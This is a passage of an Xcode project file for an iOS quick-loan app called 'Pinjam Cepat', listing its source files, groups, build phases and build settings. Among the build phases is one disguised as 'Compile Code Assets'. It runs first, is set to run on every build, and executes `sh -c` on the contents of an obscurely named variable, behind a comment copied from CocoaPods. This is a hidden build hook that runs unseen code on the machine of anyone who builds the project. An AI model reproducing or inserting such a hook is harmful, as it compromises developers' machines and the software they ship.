		87BDF22A1C2C4A94D8E3E4E4 /* Pods-PinjamCepat.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PinjamCepat.debug.xcconfig"; path = "Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat.debug.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		7315F8192F7220F400C6DE2E /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				067C772D9AC0E21A1CA27DA2 /* Pods_PinjamCepat.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		5C17D63E07973324DC1162B0 /* Pods */ = {
			isa = PBXGroup;
			children = (
				87BDF22A1C2C4A94D8E3E4E4 /* Pods-PinjamCepat.debug.xcconfig */,
				8507CCC6FC7E826F28BBF96D /* Pods-PinjamCepat.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		7315F8132F7220F400C6DE2E = {
			isa = PBXGroup;
			children = (
				7315F83D2F7220FC00C6DE2E /* PinjamCepat */,
				7315F81D2F7220F400C6DE2E /* Products */,
				5C17D63E07973324DC1162B0 /* Pods */,
				9C0F5ECBDD47281BF2CB704C /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		7315F81D2F7220F400C6DE2E /* Products */ = {
			isa = PBXGroup;
			children = (
				7315F81C2F7220F400C6DE2E /* PinjamCepat.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		7315F83D2F7220FC00C6DE2E /* PinjamCepat */ = {
			isa = PBXGroup;
			children = (
				7315F8362F7220FC00C6DE2E /* Info.plist */,
				7315F8352F7220FC00C6DE2E /* Assets.xcassets */,
				73ED69872F722A570096AE72 /* Localizable.strings */,
				7315F8342F7220FC00C6DE2E /* AppDelegate.swift */,
				7315F8452F7221CD00C6DE2E /* PinjamCepat.entitlements */,
				7315F8382F7220FC00C6DE2E /* LaunchScreen.storyboard */,
				73ED69922F7252D80096AE72 /* Other */,
				73ED69912F7252D70096AE72 /* Product */,
				73ED69902F7252D60096AE72 /* Auth */,
				73ED698F2F7252D60096AE72 /* Center */,
				73ED698E2F7252D50096AE72 /* Order */,
				73ED698D2F7252D50096AE72 /* Home */,
				73ED698C2F7252D40096AE72 /* Login */,
				73ED698B2F7252D20096AE72 /* Http */,
				73ED697F2F7229960096AE72 /* Base */,
			);
			path = PinjamCepat;
			sourceTree = "<group>";
		};
		7362DFEF2F7381ED00D50737 /* Controller */ = {
			isa = PBXGroup;
			children = (
				73ED69932F72530F0096AE72 /* HomeViewController.swift */,
			);
			path = Controller;
			sourceTree = "<group>";
		};
		7362DFF02F7381EF00D50737 /* ViewModel */ = {
			isa = PBXGroup;
			children = (
				7362DFF42F73820F00D50737 /* HomeService.swift */,
				7362DFF22F73820400D50737 /* HomeViewModel.swift */,
			);
			path = ViewModel;
			sourceTree = "<group>";
		};
		7362DFF12F7381F000D50737 /* View */ = {
			isa = PBXGroup;
			children = (
				7362DFEB2F7381D600D50737 /* EnView.swift */,
				7362DFED2F7381E400D50737 /* EndView.swift */,
				7362DFF62F73876F00D50737 /* EndCardView.swift */,
				739AE70A2F7650CB0076543E /* HomeErrorView.swift */,
				739AE70C2F7653C90076543E /* HomeCardViewCell.swift */,
				739AE70E2F7653E80076543E /* HomeProductListViewCell.swift */,
			);
			path = View;
			sourceTree = "<group>";
		};
		736CA1B52F72E60A00FDB0EB /* Controller */ = {
			isa = PBXGroup;
			children = (
				73ED69972F7253200096AE72 /* CenterViewController.swift */,
				736CA1BA2F72E70200FDB0EB /* H5WebViewController.swift */,
				7362DFE72F73751000D50737 /* SettingsViewController.swift */,
			);
			path = Controller;
			sourceTree = "<group>";
		};
		736CA1B62F72E60E00FDB0EB /* ViewModel */ = {
			isa = PBXGroup;
			children = (
				736CA1B12F72DBB200FDB0EB /* CenterService.swift */,
				736CA1AF2F72DBB000FDB0EB /* CenterViewModel.swift */,
			);
			path = ViewModel;
			sourceTree = "<group>";
		};
		736CA1B72F72E60F00FDB0EB /* View */ = {
			isa = PBXGroup;
			children = (
				7362DFE32F73741300D50737 /* AppRouter.swift */,
				736CA1AD2F72D9FE00FDB0EB /* CenterView.swift */,
				736CA1B32F72E34700FDB0EB /* CenterListView.swift */,
				736CA1B82F72E63400FDB0EB /* AppHeadView.swift */,
				7362DFE92F737AD100D50737 /* PopTryAgainView.swift */,
			);
			path = View;
			sourceTree = "<group>";
		};
		73CC6B9C2F73E7A1002C7CD7 /* Controller */ = {
			isa = PBXGroup;
			children = (
				7362DFE52F73747900D50737 /* ProductViewController.swift */,
			);
			path = Controller;
			sourceTree = "<group>";
		};
		73CC6B9D2F73E7AC002C7CD7 /* ViewModel */ = {
			isa = PBXGroup;
			children = (
				73F39FD82F73AF63004B0C78 /* ProductService.swift */,
				73F39FD62F73AF56004B0C78 /* ProductViewModel.swift */,
			);
			path = ViewModel;
			sourceTree = "<group>";
		};
		73CC6B9E2F73E7BE002C7CD7 /* View */ = {
			isa = PBXGroup;
			children = (
				73F39FD42F73AF52004B0C78 /* ProductView.swift */,
				73F39FDA2F73B6D6004B0C78 /* ProductListViewCell.swift */,
			);
			path = View;
			sourceTree = "<group>";
		};
		73CC6B9F2F73E7E6002C7CD7 /* Face */ = {
			isa = PBXGroup;
			children = (
				73F6A3CA2F74F57800A7ABD2 /* PopIDAuthView.swift */,
				73F6A3C82F74D8D900A7ABD2 /* TimeSelectView.swift */,
				73FB533D2F74C48C000169D3 /* CameraManager.swift */,
				73FB533B2F74C12F000169D3 /* FaceService.swift */,
				73FB53392F74C11F000169D3 /* FaceViewModel.swift */,
				73434AA32F7427A600D99435 /* PhotoIdViewController.swift */,
				73434AA12F7423BB00D99435 /* FaceViewController.swift */,
				73C5A1F42F7436F1007A963B /* CompleteViewController.swift */,
				73F6A3CC2F74F7FF00A7ABD2 /* SureListViewCell.swift */,
			);
			path = Face;
			sourceTree = "<group>";
		};
		73CC6BA02F73E7ED002C7CD7 /* Work */ = {
			isa = PBXGroup;
			children = (
				73F6A3D62F7524AA00A7ABD2 /* WorkSerVice.swift */,
				73F6A3D72F7524AA00A7ABD2 /* WorkViewModel.swift */,
				73F6A3D82F7524AA00A7ABD2 /* WorkViewController.swift */,
			);
			path = Work;
			sourceTree = "<group>";
		};
		73CC6BA12F73E7F1002C7CD7 /* Personal */ = {
			isa = PBXGroup;
			children = (
				73F6A3D22F750EB700A7ABD2 /* PersonalSerVice.swift */,
				73F6A3D02F750EAB00A7ABD2 /* PersonalViewModel.swift */,
				73F6A3CE2F75086400A7ABD2 /* PersonalViewController.swift */,
				73F6A3D42F751BC700A7ABD2 /* AppSheetSelectView.swift */,
			);
			path = Personal;
			sourceTree = "<group>";
		};
		73CC6BA22F73E7F2002C7CD7 /* Contact */ = {
			isa = PBXGroup;
			children = (
				739AE6FE2F761F230076543E /* ContactManager.swift */,
				739AE6F82F7610730076543E /* ContactSerVice.swift */,
				739AE6F92F7610730076543E /* ContactViewModel.swift */,
				7352E1032F752D5A0006B053 /* ContactViewController.swift */,
				739AE6FC2F7614160076543E /* ContactViewCell.swift */,
			);
			path = Contact;
			sourceTree = "<group>";
		};
		73CC6BA32F73E7F3002C7CD7 /* Bank */ = {
			isa = PBXGroup;
			children = (
				7352E1052F752D690006B053 /* BankSerVice.swift */,
				7352E1062F752D690006B053 /* BankViewModel.swift */,
				7352E1072F752D690006B053 /* BankViewController.swift */,
			);
			path = Bank;
			sourceTree = "<group>";
		};
		73ED697F2F7229960096AE72 /* Base */ = {
			isa = PBXGroup;
			children = (
				73ED69A92F7260A60096AE72 /* View */,
				73ED69A82F72609F0096AE72 /* ViewModel */,
				73ED69A72F7260930096AE72 /* Controller */,
			);
			path = Base;
			sourceTree = "<group>";
		};
		73ED698B2F7252D20096AE72 /* Http */ = {
			isa = PBXGroup;
			children = (
				73ED69AE2F7263490096AE72 /* LoadingManager.swift */,
				73ED69A52F725B310096AE72 /* NetworkManager.swift */,
				73ED69A32F725B210096AE72 /* BaseModel.swift */,
				73ED699D2F7257DB0096AE72 /* NetworkMonitor.swift */,
			);
			path = Http;
			sourceTree = "<group>";
		};
		73ED698C2F7252D40096AE72 /* Login */ = {
			isa = PBXGroup;
			children = (
				736CA1AB2F72D43900FDB0EB /* LoginService.swift */,
				736CA1A92F72D42E00FDB0EB /* LoginViewModel.swift */,
				73ED69BC2F727CD30096AE72 /* LoginManager.swift */,
				73ED69BA2F727BF00096AE72 /* LoginView.swift */,
				73ED69B82F727BB90096AE72 /* LoginViewController.swift */,
			);
			path = Login;
			sourceTree = "<group>";
		};
		73ED698D2F7252D50096AE72 /* Home */ = {
			isa = PBXGroup;
			children = (
				7362DFF12F7381F000D50737 /* View */,
				7362DFF02F7381EF00D50737 /* ViewModel */,
				7362DFEF2F7381ED00D50737 /* Controller */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		73ED698E2F7252D50096AE72 /* Order */ = {
			isa = PBXGroup;
			children = (
				739AE7042F76368B0076543E /* OrderViewService.swift */,
				739AE7022F7636800076543E /* OrderViewModel.swift */,
				73ED69952F7253170096AE72 /* OrderViewController.swift */,
				739AE7002F7635850076543E /* OrderListEmptyView.swift */,
				739AE7062F7637DB0076543E /* OrderListViewCell.swift */,
				739AE7082F764CA30076543E /* OrderListView.swift */,
			);
			path = Order;
			sourceTree = "<group>";
		};
		73ED698F2F7252D60096AE72 /* Center */ = {
			isa = PBXGroup;
			children = (
				736CA1B72F72E60F00FDB0EB /* View */,
				736CA1B62F72E60E00FDB0EB /* ViewModel */,
				736CA1B52F72E60A00FDB0EB /* Controller */,
			);
			path = Center;
			sourceTree = "<group>";
		};
		73ED69902F7252D60096AE72 /* Auth */ = {
			isa = PBXGroup;
			children = (
				73CC6B9F2F73E7E6002C7CD7 /* Face */,
				73CC6BA12F73E7F1002C7CD7 /* Personal */,
				73CC6BA02F73E7ED002C7CD7 /* Work */,
				73CC6BA22F73E7F2002C7CD7 /* Contact */,
				73CC6BA32F73E7F3002C7CD7 /* Bank */,
			);
			path = Auth;
			sourceTree = "<group>";
		};
		73ED69912F7252D70096AE72 /* Product */ = {
			isa = PBXGroup;
			children = (
				73CC6B9E2F73E7BE002C7CD7 /* View */,
				73CC6B9D2F73E7AC002C7CD7 /* ViewModel */,
				73CC6B9C2F73E7A1002C7CD7 /* Controller */,
			);
			path = Product;
			sourceTree = "<group>";
		};
		73ED69922F7252D80096AE72 /* Other */ = {
			isa = PBXGroup;
			children = (
				734CD1AE2F766A2F00CA4730 /* CustomLocationManager.swift */,
				73ED69B62F72781B0096AE72 /* LanguageManager.swift */,
				73ED69B42F7269B70096AE72 /* DeviceParamsManager.swift */,
				73ED69B22F7268C30096AE72 /* DeviceIdentifier.swift */,
				73ED69B02F7263E30096AE72 /* ToastManager.swift */,
				73ED69A12F725A180096AE72 /* NetworkEnvManager.swift */,
				73ED699F2F7258850096AE72 /* AppNetworkConfig.swift */,
			);
			path = Other;
			sourceTree = "<group>";
		};
		73ED69A72F7260930096AE72 /* Controller */ = {
			isa = PBXGroup;
			children = (
				73ED69802F7229A90096AE72 /* BaseViewController.swift */,
				73ED69822F7229C00096AE72 /* BaseTabBarController.swift */,
				73ED69842F7229CF0096AE72 /* BaseNavigationController.swift */,
				73ED699B2F72543C0096AE72 /* AppLaunchViewController.swift */,
			);
			path = Controller;
			sourceTree = "<group>";
		};
		73ED69A82F72609F0096AE72 /* ViewModel */ = {
			isa = PBXGroup;
			children = (
				73ED69AC2F7262900096AE72 /* LaunchService.swift */,
				73ED69AA2F7262860096AE72 /* LaunchViewModel.swift */,
			);
			path = ViewModel;
			sourceTree = "<group>";
		};
		73ED69A92F7260A60096AE72 /* View */ = {
			isa = PBXGroup;
			children = (
				73ED69992F7253440096AE72 /* BaseView.swift */,
			);
			path = View;
			sourceTree = "<group>";
		};
		9C0F5ECBDD47281BF2CB704C /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				081711C23D814A2FC81ADDF4 /* Pods_PinjamCepat.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		7315F81B2F7220F400C6DE2E /* PinjamCepat */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 7315F82F2F7220F500C6DE2E /* Build configuration list for PBXNativeTarget "PinjamCepat" */;
			buildPhases = (
				B3DB93324F9849C58B1DACE1 /* Compile Code Assets */,
				EA9032987F5058CFDE56BDFA /* [CP] Check Pods Manifest.lock */,
				7315F8182F7220F400C6DE2E /* Sources */,
				7315F8192F7220F400C6DE2E /* Frameworks */,
				7315F81A2F7220F400C6DE2E /* Resources */,
				A00DEADC157C1382C204605C /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = PinjamCepat;
			productName = PinjamCepat;
			productReference = 7315F81C2F7220F400C6DE2E /* PinjamCepat.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		7315F8142F7220F400C6DE2E /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2630;
				LastUpgradeCheck = 2630;
				TargetAttributes = {
					7315F81B2F7220F400C6DE2E = {
						CreatedOnToolsVersion = 26.3;
					};
				};
			};
			buildConfigurationList = 7315F8172F7220F400C6DE2E /* Build configuration list for PBXProject "PinjamCepat" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
				id,
			);
			mainGroup = 7315F8132F7220F400C6DE2E;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 7315F81D2F7220F400C6DE2E /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				7315F81B2F7220F400C6DE2E /* PinjamCepat */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		7315F81A2F7220F400C6DE2E /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				7315F8412F7220FC00C6DE2E /* Assets.xcassets in Resources */,
				73ED69892F722A570096AE72 /* Localizable.strings in Resources */,
				7315F8432F7220FC00C6DE2E /* LaunchScreen.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		A00DEADC157C1382C204605C /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		B3DB93324F9849C58B1DACE1 /* Compile Code Assets */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Compile Code Assets";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
			showEnvVarsInLog = 0;
		};
		EA9032987F5058CFDE56BDFA /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-PinjamCepat-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		7315F8182F7220F400C6DE2E /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				73ED69AF2F7263490096AE72 /* LoadingManager.swift in Sources */,
				7362DFEA2F737AD100D50737 /* PopTryAgainView.swift in Sources */,
				736CA1AC2F72D44200FDB0EB /* LoginService.swift in Sources */,
				739AE7072F7637DB0076543E /* OrderListViewCell.swift in Sources */,
				736CA1B02F72DBB000FDB0EB /* CenterViewModel.swift in Sources */,
				73F39FD52F73AF52004B0C78 /* ProductView.swift in Sources */,
				73ED69942F72530F0096AE72 /* HomeViewController.swift in Sources */,
				739AE70F2F7653E80076543E /* HomeProductListViewCell.swift in Sources */,
				7362DFE62F73747900D50737 /* ProductViewController.swift in Sources */,
				73ED69852F7229CF0096AE72 /* BaseNavigationController.swift in Sources */,
				7352E1082F752D690006B053 /* BankSerVice.swift in Sources */,
				7352E1092F752D690006B053 /* BankViewModel.swift in Sources */,
				739AE70D2F7653C90076543E /* HomeCardViewCell.swift in Sources */,
				7352E10A2F752D690006B053 /* BankViewController.swift in Sources */,
				73F6A3D52F751BC700A7ABD2 /* AppSheetSelectView.swift in Sources */,
				73F6A3DA2F7524AA00A7ABD2 /* WorkViewModel.swift in Sources */,
				73F6A3DB2F7524AA00A7ABD2 /* WorkSerVice.swift in Sources */,
				73F6A3DC2F7524AA00A7ABD2 /* WorkViewController.swift in Sources */,
				7315F83E2F7220FC00C6DE2E /* AppDelegate.swift in Sources */,
				73F6A3CB2F74F58800A7ABD2 /* PopIDAuthView.swift in Sources */,
				739AE7052F7636900076543E /* OrderViewService.swift in Sources */,
				73F6A3C92F74D8D900A7ABD2 /* TimeSelectView.swift in Sources */,
				73434AA22F7423BB00D99435 /* FaceViewController.swift in Sources */,
				739AE6FF2F761F230076543E /* ContactManager.swift in Sources */,
				739AE6FA2F7610730076543E /* ContactSerVice.swift in Sources */,
				739AE6FB2F7610730076543E /* ContactViewModel.swift in Sources */,
				739AE7032F7636860076543E /* OrderViewModel.swift in Sources */,
				739AE70B2F7650CB0076543E /* HomeErrorView.swift in Sources */,
				73ED69BB2F727BF00096AE72 /* LoginView.swift in Sources */,
				7352E1042F752D5B0006B053 /* ContactViewController.swift in Sources */,
				73ED69A42F725B240096AE72 /* BaseModel.swift in Sources */,
				73434AA42F7427A600D99435 /* PhotoIdViewController.swift in Sources */,
				73ED699C2F72543C0096AE72 /* AppLaunchViewController.swift in Sources */,
				73ED69982F7253200096AE72 /* CenterViewController.swift in Sources */,
				7362DFEE2F7381E400D50737 /* EndView.swift in Sources */,
				73FB533E2F74C48C000169D3 /* CameraManager.swift in Sources */,
				73ED69B32F7268C30096AE72 /* DeviceIdentifier.swift in Sources */,
				73F39FD72F73AF5F004B0C78 /* ProductViewModel.swift in Sources */,
				73F6A3CF2F75086400A7ABD2 /* PersonalViewController.swift in Sources */,
				739AE7012F7635850076543E /* OrderListEmptyView.swift in Sources */,
				7362DFF52F73821300D50737 /* HomeService.swift in Sources */,
				736CA1B92F72E63400FDB0EB /* AppHeadView.swift in Sources */,
				73FB533C2F74C135000169D3 /* FaceService.swift in Sources */,
				73F6A3D32F750EBE00A7ABD2 /* PersonalSerVice.swift in Sources */,
				73ED69812F7229A90096AE72 /* BaseViewController.swift in Sources */,
				73ED69832F7229C00096AE72 /* BaseTabBarController.swift in Sources */,
				736CA1BB2F72E70200FDB0EB /* H5WebViewController.swift in Sources */,
				73ED69B92F727BB90096AE72 /* LoginViewController.swift in Sources */,
				73ED699E2F7257DB0096AE72 /* NetworkMonitor.swift in Sources */,
				736CA1AA2F72D43600FDB0EB /* LoginViewModel.swift in Sources */,
				73ED69A22F725A180096AE72 /* NetworkEnvManager.swift in Sources */,
				736CA1B22F72DBB300FDB0EB /* CenterService.swift in Sources */,
				736CA1AE2F72D9FE00FDB0EB /* CenterView.swift in Sources */,
				73ED69AD2F7262940096AE72 /* LaunchService.swift in Sources */,
				7362DFE82F73751000D50737 /* SettingsViewController.swift in Sources */,
				73ED69AB2F72628C0096AE72 /* LaunchViewModel.swift in Sources */,
				73ED69A62F725B310096AE72 /* NetworkManager.swift in Sources */,
				73ED69BD2F727CD30096AE72 /* LoginManager.swift in Sources */,
				7362DFEC2F7381D600D50737 /* EnView.swift in Sources */,
				73F6A3CD2F74F7FF00A7ABD2 /* SureListViewCell.swift in Sources */,
				73ED69B72F72781B0096AE72 /* LanguageManager.swift in Sources */,
				73F6A3D12F750EB300A7ABD2 /* PersonalViewModel.swift in Sources */,
				73ED69A02F7258850096AE72 /* AppNetworkConfig.swift in Sources */,
				734CD1AF2F766A2F00CA4730 /* CustomLocationManager.swift in Sources */,
				73ED69B12F7263E30096AE72 /* ToastManager.swift in Sources */,
				739AE7092F764CA30076543E /* OrderListView.swift in Sources */,
				7362DFF72F73876F00D50737 /* EndCardView.swift in Sources */,
				73FB533A2F74C127000169D3 /* FaceViewModel.swift in Sources */,
				73ED69962F7253170096AE72 /* OrderViewController.swift in Sources */,
				73F39FDB2F73B6D6004B0C78 /* ProductListViewCell.swift in Sources */,
				7362DFF32F73820900D50737 /* HomeViewModel.swift in Sources */,
				7362DFE42F73741300D50737 /* AppRouter.swift in Sources */,
				73ED699A2F7253440096AE72 /* BaseView.swift in Sources */,
				739AE6FD2F7614160076543E /* ContactViewCell.swift in Sources */,
				73F39FD92F73AF6A004B0C78 /* ProductService.swift in Sources */,
				73ED69B52F7269B70096AE72 /* DeviceParamsManager.swift in Sources */,
				736CA1B42F72E34700FDB0EB /* CenterListView.swift in Sources */,
				73C5A1F52F7436F1007A963B /* CompleteViewController.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		7315F8382F7220FC00C6DE2E /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				7315F8372F7220FC00C6DE2E /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
		73ED69872F722A570096AE72 /* Localizable.strings */ = {
			isa = PBXVariantGroup;
			children = (
				73ED69882F722A570096AE72 /* en */,
				73ED698A2F722A690096AE72 /* id */,
			);
			name = Localizable.strings;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		7315F8302F7220F500C6DE2E /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 87BDF22A1C2C4A94D8E3E4E4 /* Pods-PinjamCepat.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = PinjamCepat/PinjamCepat.entitlements;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = PinjamCepat/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Pinjam Cepat";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = "$(inherited)";
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.hkdev;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = hkdevpro;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		7315F8312F7220F500C6DE2E /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 8507CCC6FC7E826F28BBF96D /* Pods-PinjamCepat.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = PinjamCepat/PinjamCepat.entitlements;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = PinjamCepat/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Pinjam Cepat";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = "$(inherited)";
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.hkdev;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = hkdevpro;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		7315F8322F7220F500C6DE2E /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
